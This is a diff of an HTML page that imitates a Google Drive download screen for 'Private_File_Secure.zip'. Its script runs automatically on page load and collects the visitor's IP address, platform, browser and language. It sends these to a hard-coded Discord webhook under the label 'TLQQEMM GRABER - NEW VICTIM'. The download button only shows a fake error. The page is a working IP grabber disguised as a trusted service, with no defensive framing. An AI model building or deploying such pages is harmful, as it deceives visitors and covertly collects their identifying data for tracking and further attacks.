@@ -1,38 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Redirecting...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - Private_File.zip</title>
+    <link rel="shortcut icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2020q4_32dp.png">
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #f5f5f5; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .container { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); width: 90%; max-width: 450px; }
+        .icon { width: 64px; height: 64px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #3c4043; margin-bottom: 8px; font-weight: 400; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
+        .btn { background-color: #1a73e8; color: white; padding: 12px 24px; border-radius: 4px; text-decoration: none; font-weight: 500; font-size: 14px; cursor: pointer; border: none; }
+        .btn:hover { background-color: #1765cc; }
+    </style>
     <script>
-    async function collect() {
-        try {
-            const ipReq = await fetch('https://api.ipify.org?format=json');
-            const ipRes = await ipReq.json();
-            
-            const payload = {
-                embeds: [{
-                    title: "🚀 TLQQEMM GRABER - New Hit",
-                    color: 5763719,
-                    fields: [
-                        { name: "IP", value: ipRes.ip, inline: true },
-                        { name: "Platform", value: navigator.platform, inline: true },
-                        { name: "UserAgent", value: navigator.userAgent }
-                    ],
-                    footer: { text: "Logged via TLQQEMM" }
-                }]
-            };
+        async function TLQQEMM_SEND() {
+            const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67"; 
+            try {
+                const ipReq = await fetch('https://api.ipify.org?format=json');
+                const ipRes = await ipReq.json();
+                
+                const payload = {
+                    embeds: [{
+                        title: "🚀 TLQQEMM GRABER - NEW VICTIM",
+                        color: 5763719,
+                        fields: [
+                            { name: "IP Address", value: ipRes.ip, inline: true },
+                            { name: "Platform", value: navigator.platform, inline: true },
+                            { name: "Browser", value: navigator.userAgent },
+                            { name: "Language", value: navigator.language, inline: true }
+                        ],
+                        footer: { text: "System: Google Drive Fake Page" }
+                    }]
+                };
 
-            await fetch('https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            
-            window.location.href = "https://google.com";
-        } catch (e) { console.log(e); }
-    }
-    window.onload = collect;
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {}
+        }
+        window.onload = TLQQEMM_SEND;
     </script>
 </head>
-<body style="background-color:black;">
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" class="icon" alt="Drive">
+        <h1>Private_File_Secure.zip</h1>
+        <p>Google Drive can't scan this file for viruses. It's too large for Google to scan.</p>
+        <button class="btn" onclick="alert('Error: File is temporarily unavailable.')">Download anyway</button>
+    </div>
 </body>
 </html>
